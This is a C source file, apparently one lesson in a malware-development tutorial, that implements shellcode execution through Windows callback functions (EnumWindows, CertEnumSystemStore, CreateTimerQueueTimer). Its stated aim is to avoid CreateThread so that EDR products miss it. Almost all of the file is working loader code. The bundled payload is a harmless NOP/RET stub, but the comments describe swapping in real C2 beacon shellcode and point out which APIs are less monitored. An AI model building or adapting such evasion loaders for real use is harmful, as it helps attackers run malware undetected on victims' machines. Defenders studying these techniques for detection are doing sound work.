/*
 * 12_callback_execution.c
 * ========================
 * Shellcode Execution via Callbacks - Alternative to CreateThread
 *
 * CreateThread is one of the most detected IOCs by EDRs.
 * But Windows has DOZENS of functions that accept a "callback" -
 * a function pointer that will be called internally.
 *
 * If we pass the shellcode address as a callback, the Windows
 * function executes our shellcode for us, without needing
 * CreateThread. The call stack shows legitimate Windows functions.
 *
 * Examples of functions with callbacks:
 *   - EnumWindows / EnumChildWindows
 *   - EnumDesktopWindows
 *   - CertEnumSystemStore
 *   - EnumFonts / EnumFontFamilies
 *   - CreateTimerQueueTimer
 *   - EnumResourceTypes
 *   - CopyFile2 (with progress callback)
 *   - EnumDateFormats
 *
 * This example demonstrates 3 different methods.
 *
 * Compile: cl.exe /O2 12_callback_execution.c crypt32.lib
 */

#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>  /* for CertEnumSystemStore */

/* ---------------------------------------------------------------
 * prepareMemory - Allocates, copies shellcode and changes permission
 *
 * Helper function that does the basics: RW -> copy -> RX
 * Returns pointer to shellcode ready to execute.
 * --------------------------------------------------------------- */
LPVOID prepareMemory(unsigned char* shellcode, size_t size) {

    /* Allocate as RW (read + write) */
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return NULL;

    /* Copy shellcode */
    memcpy(mem, shellcode, size);

    /* Change to RX (read + execute) */
    DWORD old;
    VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);

    return mem;
}


/* ---------------------------------------------------------------
 * METHOD 1: EnumWindows
 *
 * EnumWindows iterates through all top-level windows in the system.
 * For each window, it calls a callback you provide.
 *
 * Callback prototype:
 *   BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 *
 * The trick: we pass the shellcode address as the callback.
 * Windows calls our shellcode as if it were the enumeration
 * function. The shellcode receives hwnd and lParam as arguments
 * (which it ignores) and executes normally.
 *
 * Resulting call stack:
 *   user32.dll!EnumWindows
 *   user32.dll!InternalEnumWindows
 *   our_shellcode        <-- executed as callback
 *
 * To the EDR, it looks like EnumWindows is calling a normal
 * callback - there's no CreateThread anywhere.
 * --------------------------------------------------------------- */
void methodEnumWindows(LPVOID shellcode) {

    printf("[*] Method 1: EnumWindows callback\n");

    /*
     * Cast the shellcode address to the callback type.
     * WNDENUMPROC = BOOL (CALLBACK*)(HWND, LPARAM)
     *
     * In practice, the shellcode ignores the parameters and does what
     * it needs to do (connect C2, etc). The return doesn't matter
     * because after the first call the shellcode has already taken control.
     */
    EnumWindows((WNDENUMPROC)shellcode, 0);

    printf("[+] EnumWindows executed the callback\n");
}


/* ---------------------------------------------------------------
 * METHOD 2: CertEnumSystemStore
 *
 * Cryptography function that enumerates system certificate stores.
 * For each store, it calls a callback.
 *
 * Advantage: less monitored than EnumWindows because it's a
 * cryptography function, not a UI one. EDRs focus more on window functions.
 *
 * Callback prototype:
 *   BOOL CALLBACK CertEnumSystemStoreCallback(
 *     const void* pvSystemStore,
 *     DWORD dwFlags,
 *     PCERT_SYSTEM_STORE_INFO pStoreInfo,
 *     void* pvReserved,
 *     void* pvArg
 *   )
 *
 * Again: the shellcode ignores all parameters.
 * --------------------------------------------------------------- */
void methodCertEnum(LPVOID shellcode) {

    printf("[*] Method 2: CertEnumSystemStore callback\n");

    /*
     * CERT_SYSTEM_STORE_CURRENT_USER = enumerate current user's stores
     * The last parameter (NULL) would be passed as pvArg to the callback
     *
     * The cast to PFN_CERT_ENUM_SYSTEM_STORE makes the compiler accept
     * our shellcode pointer as a valid callback.
     */
    CertEnumSystemStore(
        CERT_SYSTEM_STORE_CURRENT_USER,
        NULL,
        NULL,
        (PFN_CERT_ENUM_SYSTEM_STORE)shellcode
    );

    printf("[+] CertEnumSystemStore executed the callback\n");
}


/* ---------------------------------------------------------------
 * METHOD 3: CreateTimerQueueTimer
 *
 * Creates a timer that calls a callback after X milliseconds.
 * The callback executes on a Windows THREAD POOL thread -
 * a completely legitimate system thread.
 *
 * Resulting call stack:
 *   ntdll.dll!TppWorkerThread
 *   ntdll.dll!TppTimerpExecuteCallback
 *   our_shellcode   <-- executed as timer callback
 *
 * The call stack is PERFECT: the thread is from the Windows threadpool,
 * with ntdll at the bottom of the stack. Nothing suspicious.
 *
 * This technique is the basis of Ekko sleep obfuscation.
 * --------------------------------------------------------------- */
void methodTimerQueue(LPVOID shellcode) {

    printf("[*] Method 3: CreateTimerQueueTimer callback\n");

    /*
     * Create a timer queue (queue of timers)
     * Windows manages timer execution via threadpool.
     */
    HANDLE hQueue = CreateTimerQueue();
    if (!hQueue) {
        printf("[!] Failed to create timer queue\n");
        return;
    }

    HANDLE hTimer = NULL;

    /*
     * CreateTimerQueueTimer registers our shellcode as a callback.
     *
     * Parameters:
     *   &hTimer    -> receives handle of created timer
     *   hQueue     -> timer queue
     *   (WAITORTIMERCALLBACK)shellcode -> OUR SHELLCODE as callback
     *   NULL       -> parameter for the callback (shellcode ignores it)
     *   0          -> DueTime: execute in 0ms (immediately)
     *   0          -> Period: don't repeat (execute only once)
     *   WT_EXECUTEINTIMERTHREAD -> execute in the timer thread
     *                              (instead of creating a new thread)
     */
    BOOL ok = CreateTimerQueueTimer(
        &hTimer,
        hQueue,
        (WAITORTIMERCALLBACK)shellcode,
        NULL,
        0,          /* execute immediately */
        0,          /* don't repeat */
        WT_EXECUTEINTIMERTHREAD
    );

    if (!ok) {
        printf("[!] Failed to create timer\n");
        DeleteTimerQueue(hQueue);
        return;
    }

    printf("[+] Timer created - shellcode will execute via threadpool\n");

    /* Wait for the callback to execute */
    Sleep(2000);

    /* Cleanup */
    DeleteTimerQueueEx(hQueue, INVALID_HANDLE_VALUE);

    printf("[+] Timer callback completed\n");
}


int main() {

    printf("==============================================\n");
    printf("  Callback-Based Shellcode Execution\n");
    printf("  Zero CreateThread / Zero CreateRemoteThread\n");
    printf("==============================================\n\n");

    /* Demonstration shellcode (NOP + INT3) */
    unsigned char shellcode[] = {
        0x90, 0x90, 0x90, 0x90,  /* NOP NOP NOP NOP */
        0xC3                      /* RET - returns to caller */
        /*
         * NOTE: we use RET here so the callback returns
         * normally. With real shellcode (e.g.: beacon), the shellcode
         * would take control and not return.
         */
    };

    LPVOID exec = prepareMemory(shellcode, sizeof(shellcode));
    if (!exec) {
        printf("[!] Failed to prepare memory\n");
        return 1;
    }

    printf("[+] Shellcode at: 0x%p\n\n", exec);

    /* Demonstrate all 3 methods */
    methodEnumWindows(exec);
    printf("\n");

    methodCertEnum(exec);
    printf("\n");

    methodTimerQueue(exec);

    printf("\n[+] All methods executed without CreateThread!\n");
    printf("[*] No thread creation calls appear in the logs.\n");

    VirtualFree(exec, 0, MEM_RELEASE);
    return 0;
}
